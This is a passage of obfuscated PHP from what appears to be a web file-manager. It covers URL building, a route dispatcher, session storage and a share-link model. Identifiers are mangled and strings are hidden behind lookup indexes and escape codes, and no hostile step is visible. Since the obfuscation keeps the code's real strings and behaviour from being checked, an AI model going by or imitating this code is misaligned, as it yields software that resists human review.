4) == $ÎâÙı¨ï[145] || substr($◊¬¥ì¿Í, 0, 2) == $ÎâÙı¨ï[1352]) { $€¸ˆâƒ« = $◊¬¥ì¿Í . $ÎâÙı¨ï[1572] . $ôﬂïº• ; } else { if ($ì±‰„¯â == $ÎâÙı¨ï[12]) { $€¸ˆâƒ« = $this->pluginHost . $◊¬¥ì¿Í . $ÎâÙı¨ï[1572] . $ôﬂïº• ; } else { if ($ì±‰„¯â === $ÎâÙı¨ï[79]) { $€¸ˆâƒ« = $this->pluginHost . $◊¬¥ì¿Í; } else { if ($ì±‰„¯â == $ÎâÙı¨ï[1573]) { $€¸ˆâƒ« = STATIC_PATH . $◊¬¥ì¿Í . $ÎâÙı¨ï[1572] . $©ı°ø£; } else { if ($ì±‰„¯â == $ÎâÙı¨ï[1574]) { $€¸ˆâƒ« = APP_HOST . $ÎâÙı¨ï[1575] . $◊¬¥ì¿Í . $ÎâÙı¨ï[1572] . $©ı°ø£; } else { if (isset($ÏõÍ∏∆°[$ì±‰„¯â])) { $€¸ˆâƒ« = $ÏõÍ∏∆°[$ì±‰„¯â] . $◊¬¥ì¿Í . $ÎâÙı¨ï[1572] . $ôﬂïº• ; } } } } } } if (!$Ò‰Âì´è) { return $€¸ˆâƒ«; } echo $€¸ˆâƒ«; } public function link($√É‘ë»ã = false, $˚Ω∂˝¢ú = '') { $£‚ù¶â• =& $_SERVER[Çâä∆◊¡]; if (!$√É‘ë»ã) { $this->link($£‚ù¶â•[1576], $£‚ù¶â•[1574]); $this->link($£‚ù¶â•[1577], $£‚ù¶â•[1573]); $this->link($£‚ù¶â•[1578], $£‚ù¶â•[1573]); $this->link($£‚ù¶â•[1579], $£‚ù¶â•[1573]); $this->link($£‚ù¶â•[1580], $£‚ù¶â•[1573]); return; } $çî—Óì¶ = $this->url($√É‘ë»ã, $˚Ω∂˝¢ú, !1); if (substr($√É‘ë»ã, -3) == $£‚ù¶â•[1581]) { echo $£‚ù¶â•[1582] . $çî—Óì¶ . $£‚ù¶â•[1583] . $£‚ù¶â•[226]; } else { if (substr($√É‘ë»ã, -4) == $£‚ù¶â•[1584]) { echo $£‚ù¶â•[1585] . $çî—Óì¶ . $£‚ù¶â•[1586] . $£‚ù¶â•[226]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\171" => "\133\x5e\x2f\135\x2b", "\x3a\156\x75\x6d" => "\x5b\x30\x2d\71\x5d\x2b", "\72\141\x6c\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($í–úëûÛ, $¥©ÑﬁÉÅ) { $∏≥íÁ˙° =& $_SERVER[Çâä∆◊¡]; if ($í–úëûÛ == $∏≥íÁ˙°[1587]) { $ÿÙîæ˝® = array_map($∏≥íÁ˙°[1588], $¥©ÑﬁÉÅ[0]); $˜Ûôƒ¢Õ = strpos($¥©ÑﬁÉÅ[1], $∏≥íÁ˙°[8]) === 0 ? $¥©ÑﬁÉÅ[1] : $∏≥íÁ˙°[8] . $¥©ÑﬁÉÅ[1]; $‡ÄµƒÍÀ = $¥©ÑﬁÉÅ[2]; } else { $ÿÙîæ˝® = null; $˜Ûôƒ¢Õ = strpos($¥©ÑﬁÉÅ[0], $∏≥íÁ˙°[8]) === 0 ? $¥©ÑﬁÉÅ[0] : $∏≥íÁ˙°[8] . $¥©ÑﬁÉÅ[0]; $‡ÄµƒÍÀ = $¥©ÑﬁÉÅ[1]; } array_push(self::$maps, $ÿÙîæ˝®); array_push(self::$routes, $˜Ûôƒ¢Õ); array_push(self::$methods, strtoupper($í–úëûÛ)); array_push(self::$callbacks, $‡ÄµƒÍÀ); } public static function error($åÔäÎÚ’) { self::$errorCallback = $åÔäÎÚ’; } public static function haltOnMatch($¯õå©√Ö = true) { self::$halts = $¯õå©√Ö; } public static function dispatch() { $‰ìÎÅÓã =& $_SERVER[Çâä∆◊¡]; $˙áã¬¿◊ = parse_url($_SERVER[$‰ìÎÅÓã[1589]], PHP_URL_PATH); $„†›“…” = $_SERVER[$‰ìÎÅÓã[156]]; $ä—Ö®ø¿ = array_keys(static::$patterns); $»‡¶ÂÕ¬ = array_values(static::$patterns); $ïƒ¸‘¬Æ = !1; self::$routes = preg_replace($‰ìÎÅÓã[1254], $‰ìÎÅÓã[8], self::$routes); if (in_array($˙áã¬¿◊, self::$routes)) { $Å”†´Éã = array_keys(self::$routes, $˙áã¬¿◊); foreach ($Å”†´Éã as $–åêä∞é) { if (self::$methods[$–åêä∞é] == $„†›“…” || self::$methods[$–åêä∞é] == $‰ìÎÅÓã[1590] || in_array($„†›“…”, self::$maps[$–åêä∞é])) { $ïƒ¸‘¬Æ = !0; if (!is_object(self::$callbacks[$–åêä∞é])) { $ˆ‹∞Èä« = explode($‰ìÎÅÓã[8], self::$callbacks[$–åêä∞é]); $†ô∫∆Ú = end($ˆ‹∞Èä«); $∂ü›ƒ≤˛ = explode($‰ìÎÅÓã[1591], $†ô∫∆Ú); $ø˝√òò  = new $∂ü›ƒ≤˛[0](); $ø˝√òò ->{$∂ü›ƒ≤˛[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$–åêä∞é]); if (self::$halts) { return; } } } } } else { $Ï‘›≥ˆ = 0; foreach (self::$routes as $–åêä∞é) { if (strpos($–åêä∞é, $‰ìÎÅÓã[4]) !== !1) { $–åêä∞é = str_replace($ä—Ö®ø¿, $»‡¶ÂÕ¬, $–åêä∞é); } if (preg_match($‰ìÎÅÓã[1592] . $–åêä∞é . $‰ìÎÅÓã[1593], $˙áã¬¿◊, $„√—Óá)) { if (self::$methods[$Ï‘›≥ˆ] == $„†›“…” || self::$methods[$Ï‘›≥ˆ] == $‰ìÎÅÓã[1590] || !empty(self::$maps[$Ï‘›≥ˆ]) && in_array($„†›“…”, self::$maps[$Ï‘›≥ˆ])) { $ïƒ¸‘¬Æ = !0; array_shift($„√—Óá); if (!is_object(self::$callbacks[$Ï‘›≥ˆ])) { $ˆ‹∞Èä« = explode($‰ìÎÅÓã[8], self::$callbacks[$Ï‘›≥ˆ]); $†ô∫∆Ú = end($ˆ‹∞Èä«); $∂ü›ƒ≤˛ = explode($‰ìÎÅÓã[1591], $†ô∫∆Ú); $ø˝√òò  = new $∂ü›ƒ≤˛[0](); if (!method_exists($ø˝√òò , $∂ü›ƒ≤˛[1])) { echo $‰ìÎÅÓã[1594]; } else { call_user_func_array(array($ø˝√òò , $∂ü›ƒ≤˛[1]), $„√—Óá); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Ï‘›≥ˆ], $„√—Óá); if (self::$halts) { return; } } } } $Ï‘›≥ˆ++; } } if ($ïƒ¸‘¬Æ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $’ÑÖ∑ãÁ =& $_SERVER[Çâä∆◊¡]; header($_SERVER[$’ÑÖ∑ãÁ[1595]] . $’ÑÖ∑ãÁ[1596]); echo $’ÑÖ∑ãÁ[1597]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$‰ìÎÅÓã[1589]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ïï˜§îü =& $_SERVER[Çâä∆◊¡]; static $ÒÃ∑±õ… = false; if ($ÒÃ∑±õ…) { return $ÒÃ∑±õ…; } $ôí‡À¶Ñ = $GLOBALS[$ïï˜§îü[6]][$ïï˜§îü[344]]; self::$sessionTime = $ôí‡À¶Ñ[$ïï˜§îü[1598]]; $”Ú·©«ó = isset($GLOBALS[$ïï˜§îü[1599]]) ? $GLOBALS[$ïï˜§îü[1599]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($”Ú·©«ó)) { self::$sessionSign = Cookie::get($”Ú·©«ó); } else { self::$sessionSign = guid(); } } Cookie::setSafe($”Ú·©«ó, self::$sessionSign, self::$sessionTime); $∏Ë“ÂÑë = $ôí‡À¶Ñ[$ïï˜§îü[1600]]; $˘π’ß˝Æ = $ôí‡À¶Ñ[$∏Ë“ÂÑë]; $Ωµ°¶≥„ = $ôí‡À¶Ñ[$ïï˜§îü[821]]; switch ($∏Ë“ÂÑë) { case $ïï˜§îü[21]: self::$handle = Model($ïï˜§îü[822]); break; case $ïï˜§îü[823]: self::$handle = new CacheRedis($˘π’ß˝Æ, $Ωµ°¶≥„); break; case $ïï˜§îü[824]: self::$handle = new CacheMemcached($˘π’ß˝Æ, $Ωµ°¶≥„); break; case $ïï˜§îü[192]: $˘π’ß˝Æ[$ïï˜§îü[78]] = $˘π’ß˝Æ[$ïï˜§îü[78]] . $ïï˜§îü[1601]; self::$handle = new CacheFile($˘π’ß˝Æ, $Ωµ°¶≥„); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ÒÃ∑±õ… = new self(); return $ÒÃ∑±õ…; } public static function getBySign($é√ Ä…„) { CacheLock::lock($é√ Ä…„); $Á˝ÓŒü˚ = self::$handle->get($é√ Ä…„); CacheLock::unlock($é√ Ä…„); $Á˝ÓŒü˚ = unserialize($Á˝ÓŒü˚); return is_array($Á˝ÓŒü˚) ? $Á˝ÓŒü˚ : array(); } public static function setBySign($èì˛°Ó’, $ü¨∫Ä∑) { CacheLock::lock($èì˛°Ó’); self::$handle->set($èì˛°Ó’, serialize($ü¨∫Ä∑), self::$sessionTime); CacheLock::unlock($èì˛°Ó’); } public static function sign($‰ÇÏÏÚª = false) { $‰ÇÏÏÚª && (self::$sessionSign = $‰ÇÏÏÚª); self::init(); return self::$sessionSign; } public static function set($˚£ó¸ßô, $£˘Æõﬂ = false) { self::init(); if (is_array($˚£ó¸ßô)) { foreach ($˚£ó¸ßô as $û¸≈—üΩ => $Úèõ™äÃ) { array_set_value(self::$data, $û¸≈—üΩ, $Úèõ™äÃ); } } else { array_set_value(self::$data, $˚£ó¸ßô, $£˘Æõﬂ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($§˜ÃÃè£ = false) { self::init(); if (!$§˜ÃÃè£) { return self::$data; } return array_get_value(self::$data, $§˜ÃÃè£); } public static function remove($ÏÀˆ◊›ì) { self::init(); unset(self::$data[$ÏÀˆ◊›ì]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Çâä∆◊¡][826])) { self::$handle->clearTimeout(); } } } goto eï¢”ñ∑Ï∂; bª¿ﬂâÜ√ç: class SessionModel extends ModelBase { protected $tableName = "\163\171\163\164\145\155\137\x73\x65\163\163\151\157\156"; public function get($˙Î˜•Ò˘) { $ÿ‹™™ôò =& $_SERVER[Çâä∆◊¡]; $ÏàΩÅÃ∏ = $this->where(array($ÿ‹™™ôò[1940] => $˙Î˜•Ò˘))->find(); if (!is_array($ÏàΩÅÃ∏)) { return !1; } return $ÏàΩÅÃ∏[$ÿ‹™™ôò[748]]; } public function set($òÙÖ◊¢‡, $ºæç§îı, $ª‡£Å»ç = 3600) { $Ô¸áôì∆ =& $_SERVER[Çâä∆◊¡]; $È·Öø¶„ = array($Ô¸áôì∆[1940] => $òÙÖ◊¢‡, $Ô¸áôì∆[1848] => $ºæç§îı, $Ô¸áôì∆[1941] => $ª‡£Å»ç + time()); if (Session::get($Ô¸áôì∆[1942])) { $È·Öø¶„[$Ô¸áôì∆[1642]] = Session::get($Ô¸áôì∆[1942]); } else { $È·Öø¶„[$Ô¸áôì∆[1642]] = 0; } if ($this->get($òÙÖ◊¢‡)) { return $this->where(array($Ô¸áôì∆[1940] => $òÙÖ◊¢‡))->save($È·Öø¶„); } else { return $this->add($È·Öø¶„, array(), !0); } } public function remove($íÂ‚‹Ñ®) { return $this->where(array($_SERVER[Çâä∆◊¡][1940] => $íÂ‚‹Ñ®))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Çâä∆◊¡][1943] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\162\145"; protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\x79\x54\151\x6d\145", "\164\x69\155\145", "\151\x6e\x73\x65\162\x74\54\x75\160\x64\141\x74\x65", "\x66\x75\156\143\164\151\x6f\x6e"), array("\143\x72\x65\141\164\145\124\151\x6d\x65", "\x74\151\x6d\x65", "\151\x6e\163\x65\x72\x74", "\146\x75\156\143\164\x69\x6f\156"), array("\x6f\160\x74\151\x6f\156\x73", '', "\151\156\163\x65\162\x74\x2c\165\x70\144\x61\x74\145\x2c\x73\x65\154\x65\143\164", "\152\163\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($¸⁄Â°¸≤) { $∫Â˝òÀ¶ =& $_SERVER[Çâä∆◊¡]; $âê∏ﬁ‰ﬁ = isset($¸⁄Â°¸≤[0]) ? $¸⁄Â°¸≤[0] : !1; return array($∫Â˝òÀ¶[1944] => array(USER_ID, $∫Â˝òÀ¶[1945]), $∫Â˝òÀ¶[1889] => array($âê∏ﬁ‰ﬁ, $∫Â˝òÀ¶[1946])); } protected function listSimple() { $Åﬁı∑¨ò = array($_SERVER[Çâä∆◊¡][1642] => USER_ID); $π∫æ«ﬂÖ = $this->field($this->fieldList)->where($Åﬁı∑¨ò)->select(); return $π∫æ«ﬂÖ ? $π∫æ«ﬂÖ : array(); } protected function getInfo($ò¨ÁÙ¨‹, $£±¨µòµ = false) { $›Ø·ÜÚ∂ =& $_SERVER[Çâä∆◊¡]; if ($£±¨µòµ) { return $this->_getShareInfo(array($›Ø·ÜÚ∂[488] => $ò¨ÁÙ¨‹)); } $Ô˝éÍ‰‡ = $this->cacheFunctionGet($›Ø·ÜÚ∂[1891], $ò¨ÁÙ¨‹); return $Ô˝éÍ‰‡; } public function getInfoByHash($Ò«¶´˜æ) { return $this->_getShareInfo(array($_SERVER[Çâä∆◊¡][490] => $Ò«¶´˜æ)); } public function getInfoByPath($‰˛·ﬂ¶ﬁ) { $ˆ¨∑˘Ñ˜ =& $_SERVER[Çâä∆◊¡]; $˙õÛÈ•¨ = array($ˆ¨∑˘Ñ˜[1642] => USER_ID, $ˆ¨∑˘Ñ˜[403] => $‰˛·ﬂ¶ﬁ); return $this->_getShareInfo($˙õÛÈ•¨); } public function getInfoBySourcePath($∑’¥›ÔÏ) { $Òêñ¬Ø© =& $_SERVER[Çâä∆◊¡]; $˝ÿ™«£â = array($Òêñ¬Ø©[1642] => USER_ID, $Òêñ¬Ø©[1161] => $∑’¥›ÔÏ); return $this->_getShareInfo($˝ÿ™«£â); } private function _getShareInfo($—áÚî…‡) { $§ºß¬õé =& $_SERVER[Çâä∆◊¡]; $∂Ü¯¯áî = $this->where($—áÚî…‡)->find(); if (!$∂Ü¯¯áî) { return !1; } $—áÚî…‡ = array($§ºß¬õé[488] => $∂Ü¯¯áî[$§ºß¬õé[488]]); $‹ˆ˙Ωº† = $§ºß¬õé[1947]; $æÖË »© = Model($§ºß¬õé[596])->order($§ºß¬õé[401])->field($‹ˆ˙Ωº†)->where($—áÚî…‡)->select(); if ($∂Ü¯¯áî[$§ºß¬õé[403]] == $§ºß¬õé[190]) { $∂Ü¯¯áî[$§ºß¬õé[87]] = IO::info($∂Ü¯¯áî[$§ºß¬õé[1161]]); } else { $∂Ü¯¯áî[$§ºß¬õé[87]] = Model($§ºß¬õé[1312])->pathInfo($∂Ü¯¯áî[$§ºß¬õé[403]]); } $∂Ü¯¯áî[$§ºß¬õé[1948]] = $æÖË »©; return $∂Ü¯¯áî; } protected function getInfoAuth($Ñ∫¯Òüì) { $£Ãœ≤»ä =& $_SERVER[Çâä∆◊¡]; $≥õâï£Ì = $this->getInfo($Ñ∫¯Òüì); if ($≥õâï£Ì[$£Ãœ≤»ä[1642]] == USER_ID) { $≥õâï£Ì[$£Ãœ≤»ä[414]] = $≥õâï£Ì[$£Ãœ≤»ä[87]][$£Ãœ≤»ä[414]]; } else { $≥õâï£Ì[$£Ãœ≤»ä[414]] = Model($£Ãœ≤»ä[502])->authMake($≥õâï£Ì[$£Ãœ≤»ä[1948]]); } return $≥õâï£Ì; } protected function listData($ø†ÇÚª¯ = null, $≥∆Ê¿√ª = 300) { $òÄ≠Ú¿ú =& $_SERVER[Çâä∆◊¡]; $˚ò…√Ñ˘ = array(array($òÄ≠Ú¿ú[493] => array($òÄ≠Ú¿ú[999], 0), $òÄ≠Ú¿ú[495] => array($òÄ≠Ú¿ú[999], 0), $òÄ≠Ú¿ú[1949] => $òÄ≠Ú¿ú[1905])); if ($ø†ÇÚª¯ == $òÄ≠Ú¿ú[1950]) { $˚ò…√Ñ˘ = array($òÄ≠Ú¿ú[493] => 1); } else { if ($ø†ÇÚª¯ == $òÄ≠Ú¿ú[1146]) { $˚ò…√Ñ˘ = array($òÄ≠Ú¿ú[495] => 1); } } $˚ò…√Ñ˘[$òÄ≠Ú¿ú[1642]] = USER_ID; $€°ùï¬Ë = $this->where($˚ò…√Ñ˘)->selectPage($≥∆Ê¿√ª); return $€°ùï¬Ë; } protected function listToMe($∑‚ëØ€é = 300) { $œÜΩ£ô⁄ =& $_SERVER[Çâä∆◊¡]; $˚Úå∂ªÛ = Model($œÜΩ£ô⁄[1951])->userGroupParents(USER_ID); $áö◊ØàÁ = array($œÜΩ£ô⁄[580] => SourceModel::TYPE_USER, $œÜΩ£ô⁄[504] => USER_ID); if ($˚Úå∂ªÛ) { $áö◊ØàÁ = array(array($œÜΩ£ô⁄[580] => SourceModel::TYPE_USER, $œÜΩ£ô⁄[504] => USER_ID), array($œÜΩ£ô⁄[580] => SourceModel::TYPE_GROUP, $œÜΩ£ô⁄[504] => array($œÜΩ£ô⁄[7], $˚Úå∂ªÛ)), $œÜΩ£ô⁄[1949] => $œÜΩ£ô⁄[1905]); } $é®±¥∂˙ = Model($œÜΩ£ô⁄[596])->where($áö◊ØàÁ)->selectPage($∑‚ëØ€é); $ÿìΩ´°î = array_to_keyvalue_group($é®±¥∂˙[$œÜΩ£ô⁄[364]], $œÜΩ£ô⁄[488]); if (!$ÿìΩ´°î) { return $é®±¥∂˙; } $¿í◊ÒÄò = $œÜΩ£ô⁄[1952]; $áö◊ØàÁ = array($œÜΩ£ô⁄[488] => array($œÜΩ£ô⁄[419], array_keys($ÿìΩ´°î)), $œÜΩ£ô⁄[1642] => array($œÜΩ£ô⁄[1001], $œÜΩ£ô⁄[190])); $Ω˚ˆÛ‹» = $this->field($¿í◊ÒÄò)->where($áö◊ØàÁ)->select(); foreach ($Ω˚ˆÛ‹» as $û·›àØ¿ => &$Ñ°ƒß©) { $Ñ°ƒß©[$œÜΩ£ô⁄[1948]] = $ÿìΩ´°î[$Ñ°ƒß©[$œÜΩ£ô⁄[488]]]; } unset($Ñ°ƒß©); $ÑÚÀœãû = array($œÜΩ£ô⁄[1953] => $Ω˚ˆÛ‹», $œÜΩ£ô⁄[1954] => $é®±¥∂˙[$œÜΩ£ô⁄[361]]); return $ÑÚÀœãû; } protected function shareAdd($®’˛ŸòÃ, $ﬂí∑ªÕû) { $ó√‹’Õà =& $_SERVER[Çâä∆◊¡]; $æº≠∏˛À = $this->_addShareData($®’˛ŸòÃ, $ﬂí∑ªÕû); if (!empty($ﬂí∑ªÕû[$ó√‹’Õà[1955]])) { $this->_shareAuthSet($æº≠∏˛À, $ﬂí∑ªÕû[$ó√‹’Õà[1955]]); } $this->shareEventAdd($®’˛ŸòÃ, $ﬂí∑ªÕû, $ó√‹’Õà[1149]); return $æº≠∏˛À; } protected function shareAddSystem($ÜÓ¥¶Ç‰, $®∏ìë˛°) { $é“–∏œå =& $_SERVER[Çâä∆◊¡]; $˜˝öÜÉÂ = $this->_addShareData($ÜÓ¥¶Ç‰, $®∏ìë˛°, $é“–∏œå[1261]); $this->_shareAuthSet($˜˝öÜÉÂ, $®∏ìë˛°[$é“–∏œå[1955]]); return $˜˝öÜÉÂ; } private function shareEventAdd($¶ó¸£§ò, $ö‹•·£à, $Óüºìáá = "\x61\144\x64") { $Ç‡‘Ú≈ª =& $_SERVER[Çâä∆◊¡]; if (!$¶ó¸£§ò || $¶ó¸£§ò == $Ç‡‘Ú≈ª[190]) { return; } if ($Óüºìáá == $Ç‡‘Ú≈ª[1149]) { if ($ö‹•·£à[$Ç‡‘Ú≈ª[493]] == $Ç‡‘Ú≈ª[89]) { Model($Ç‡‘Ú≈ª[564])->eventShare($¶ó¸£§ò, $Ç‡‘Ú≈ª[1956]); } if ($ö‹•·£à[$Ç‡‘Ú≈ª[495]] == $Ç‡‘Ú≈ª[89]) { Model($Ç‡‘Ú≈ª[564])->eventShare($¶ó¸£§ò, $Ç‡‘Ú≈ª[1957]); } return; } $¡∞¯ß∆ = $this->getInfoByPath($¶ó¸£§ò); $ß∆˜≈ÉŸ = $Ç‡‘Ú≈ª[1958]; if ($¡∞¯ß∆[$Ç‡‘Ú≈ª[493]] == $Ç‡‘Ú≈ª[190] && $ö‹•·£à[$Ç‡‘Ú≈ª[493]] == $Ç‡‘Ú≈ª[89]) { $ß∆˜≈ÉŸ = $Ç‡‘Ú≈ª[1956]; } if ($¡∞¯ß∆[$Ç‡‘Ú≈ª[493]] == $Ç‡‘Ú≈ª[89] && $ö‹•·£à[$Ç‡‘Ú≈ª[493]] == $Ç‡‘Ú≈ª[190]) { $ß∆˜≈ÉŸ = $Ç‡‘Ú≈ª[1959]; } if ($¡∞¯ß∆[$Ç‡‘Ú≈ª[495]] == $Ç‡‘Ú≈ª[190] && $ö‹•·£à[$Ç‡‘Ú≈ª[495]] == $Ç‡‘Ú≈ª[89]) { $ß∆˜≈ÉŸ = $Ç‡‘Ú≈ª[1957]; } if ($¡∞¯ß∆[$Ç‡‘Ú≈ª[495]] == $Ç‡‘Ú≈ª[89] && $ö‹•·£à[$Ç‡‘Ú≈ª[495]] == $Ç‡‘Ú≈ª[190]) { $ß∆˜≈ÉŸ = $Ç‡‘Ú≈ª[1960]; } Model($Ç‡‘Ú≈ª[564])->eventShare($¶ó¸£§ò, $ß∆˜≈ÉŸ); return; } private function _addShareData($˝º∞å Ÿ, $ÁÇ‹´ﬁ  = array(), $¸ÍßÂÅ¯ = false) { $‚∫≈√ã¯ =& $_SERVER[Çâä∆◊¡]; $∏æØÇ·ì = $¸ÍßÂÅ¯ == $‚∫≈√ã¯[1261] ? 0 : USER_ID; $§•‘¸Ω˜ = array($‚∫≈√ã¯[418] => $˝º∞å Ÿ, $‚∫≈√ã¯[1633] => $∏æØÇ·ì); if ($˝º∞å Ÿ == 0) { $§•‘¸Ω˜ = array($‚∫≈√ã¯[1961] => $ÁÇ‹´ﬁ [$‚∫≈√ã¯[1161]], $‚∫≈√ã¯[1633] => $∏æØÇ·ì); } if ($ÏﬂÍß¶ñ = $this->where($§•‘¸Ω˜)->find()) { return $ÏﬂÍß¶ñ[$‚∫≈√ã¯[488]]; } if ($˝º∞å Ÿ == 0) { $¨ª∏ÏÃõ = array($‚∫≈√ã¯[32] => get_path_this($ÁÇ‹´ﬁ [$‚∫≈√ã¯[78]])); } else { $¨ª∏ÏÃõ = Model($‚∫≈√ã¯[818])->sourceInfo($˝º∞å Ÿ); if (!$¨ª∏ÏÃõ) { return !1; } } if (!$ÁÇ‹´ﬁ [$‚∫≈√ã¯[1539]]) { $ÁÇ‹´ﬁ [$‚∫≈√ã¯[1539]] = $¨ª∏ÏÃõ[$‚∫≈√ã¯[32]]; } $¡îˆ–∑∂ = array($‚∫≈√ã¯[1633] => $∏æØÇ·ì, $‚∫≈√ã¯[418] => $˝º∞å Ÿ, $‚∫≈√ã¯[1539] => $‚∫≈√ã¯[12], $‚∫≈√ã¯[493] => 0, $‚∫≈√ã¯[495] => 0, $‚∫≈√ã¯[1161] => $‚∫≈√ã¯[12], $‚∫≈√ã¯[302] => $‚∫≈√ã¯[12], $‚∫≈√ã¯[876] => $‚∫≈√ã¯[12], $‚∫≈√ã¯[1962] => 0, $‚∫≈√ã¯[1963] => 0, $‚∫≈√ã¯[496] => 0, $‚∫≈√ã¯[497] => $‚∫≈√ã¯[12], $‚∫≈√ã¯[490] => $‚∫≈√ã¯[12]); $à˙Ó¸ã∏ = explode($‚∫≈√ã¯[50], $‚∫≈√ã¯[1964]); foreach ($à˙Ó¸ã∏ as $üìçç·”) { if (!isset($ÁÇ‹´ﬁ [$üìçç·”])) { continue; } $¡îˆ–∑∂[$üìçç·”] = $ÁÇ‹´ﬁ [$üìçç·”]; } $øΩù “∑ = $this->add($¡îˆ–∑∂); $ï Ô°Ÿé = array($‚∫≈√ã¯[490] => short_id($øΩù “∑)); $this->where(array($‚∫≈√ã¯[487] => $øΩù “∑))->save($ï Ô°Ÿé); return $øΩù “∑; } private function _shareAuthSet($‚¿ù∑œª, $ë»≈ºùø) { $’‡Ö·˛ó =& $_SERVER[Çâä∆◊¡]; if (!is_array($ë»≈ºùø)) { return !1; } $Ÿ∂Í’åÑ = Model($’‡Ö·˛ó[1915]); $Ÿ∂Í’åÑ->where(array($’‡Ö·˛ó[488] => $‚¿ù∑œª))->delete(); $–‚ç∂∫ã = array(); foreach ($ë»≈ºùø as $ÆŸ‚µ»Î) { $ÉçƒÓÎ‡ = SourceModel::TYPE_USER; if ($ÆŸ‚µ»Î[$’‡Ö·˛ó[412]] == SourceModel::TYPE_GROUP) { $ÉçƒÓÎ‡ = SourceModel::TYPE_GROUP; } $©ƒ’ä¿∏ = array($’‡Ö·˛ó[488] => $‚¿ù∑œª, $’‡Ö·˛ó[412] => $ÉçƒÓÎ‡, $’‡Ö·˛ó[504] => intval($ÆŸ‚µ»Î[$’‡Ö·˛ó[504]]), $’‡Ö·˛ó[1911] => 0, $’‡Ö·˛ó[1965] => -1); if ($ÆŸ‚µ»Î[$’‡Ö·˛ó[1911]]) { $©ƒ’ä¿∏[$’‡Ö·˛ó[1911]] = $ÆŸ‚µ»Î[$’‡Ö·˛ó[1911]]; } else { if ($ÆŸ‚µ»Î[$’‡Ö·˛ó[1965]]) { $©ƒ’ä¿∏[$’‡Ö·˛ó[1965]] = $ÆŸ‚µ»Î[$’‡Ö·˛ó[1965]]; } } $–‚ç∂∫ã[] = $©ƒ’ä¿∏; } return $Ÿ∂Í’åÑ->addAll($–‚ç∂∫ã, array(), !0); } public function numViewAdd($æıè†îÈ) { $⁄¡Åﬁ—Ö =& $_SERVER[Çâä∆◊¡]; $ä¨’õ…Ÿ = array($⁄¡Åﬁ—Ö[487] => $æıè†îÈ); $this->where($ä¨’õ…Ÿ)->setAdd($⁄¡Åﬁ—Ö[1962]); } public function numDownloadAdd($«âóª˚ﬂ) { $…√ÓÃÃ” =& $_SERVER[Çâä∆◊¡]; $í•‡·ﬁÕ = array($…√ÓÃÃ”[487] => $«âóª˚ﬂ); $this->where($í•‡·ﬁÕ)->setAdd($…√ÓÃÃ”[1963]); } protected function shareEdit($Õ«ôƒò‘, $ÁÔùö˘ÿ) { $Ö≠ì∏≈  =& $_SERVER[Çâä∆◊¡]; $˛™ïË‹Ù = $this->getInfo($Õ«ôƒò‘); if (!$˛™ïË‹Ù) { return !1; } $this->_checkLinkShare($ÁÔùö˘ÿ, $˛™ïË‹Ù); $˜ü≠—ÜÀ = array(); $†πóïÓ = explode($Ö≠ì∏≈ [50], $Ö≠ì∏≈ [1966]); foreach ($†πóïÓ as $¬µò‰ú–) { if (!array_key_exists($¬µò‰ú–, $ÁÔùö˘ÿ)) { continue; } $˜ü≠—ÜÀ[$¬µò‰ú–] = $ÁÔùö˘ÿ[$¬µò‰ú–]; } $this->shareEventAdd($˛™ïË‹Ù[$Ö≠ì∏≈ [403]], $ÁÔùö˘ÿ, $Ö≠ì∏≈ [1780]); $this->where(array($Ö≠ì∏≈ [487] => $Õ«ôƒò‘))->save($˜ü≠—ÜÀ); if (isset($ÁÔùö˘ÿ[$Ö≠ì∏≈ [1955]])) { $this->_shareAuthSet($Õ«ôƒò‘, $ÁÔùö˘ÿ[$Ö≠ì∏≈ [1955]]); } return !0; } private function _checkLinkShare($√–ü›˙…, $„ﬁÂ˚™) { $•∞à¿–Ü =& $_SERVER[Çâä∆◊¡]; if ($√–ü›˙…[$•∞à¿–Ü[493]] != $•∞à¿–Ü[89]) { return; } $˜¸á›¥ì = $„ﬁÂ˚™[$•∞à¿–Ü[87]][$•∞à¿–Ü[403]]; if ($„ﬁÂ˚™[$•∞à¿–Ü[87]][$•∞à¿–Ü[33]] != $•∞à¿–Ü[192]) { $âó«˜Èï = $this->_folderReport($˜¸á›¥ì); if (!$âó«˜Èï) { return; } show_json(LNG($•∞à¿–Ü[1967]) . $•∞à¿–Ü[1968] . $âó«˜Èï, !1); } $éﬂ•˜‘€ = Model($•∞à¿–Ü[818])->fileInfoGet($„ﬁÂ˚™[$•∞à¿–Ü[87]][$•∞à¿–Ü[403]]); if (!$éﬂ•˜‘€) { return; } $ƒ–∆—´˝ = $this->shareFileMeta($éﬂ•˜‘€[$•∞à¿–Ü[467]]); if (isset($ƒ–∆—´˝[$•∞à¿–Ü[369]]) && $ƒ–∆—´˝[$•∞à¿–Ü[369]] == $•∞à¿–Ü[89]) { show_json(LNG($•∞à¿–Ü[1969]), !1); } } private function _folderReport($⁄áÊ◊∞œ) { $ê¬õ≥« =& $_SERVER[Çâä∆◊¡]; $õË¡≈Ùä = array($ê¬õ≥«[467] => array($ê¬õ≥«[999], 0), $ê¬õ≥«[743] => 3); $ÜÃîû≥¬ = Model($ê¬õ≥«[1970])->where($õË¡≈Ùä)->field($ê¬õ≥«[467])->select(); if (!$ÜÃîû≥¬) { return !1; } $ÜÃîû≥¬ = array_to_keyvalue($ÜÃîû≥¬, $ê¬õ≥«[12], $ê¬õ≥«[467]); 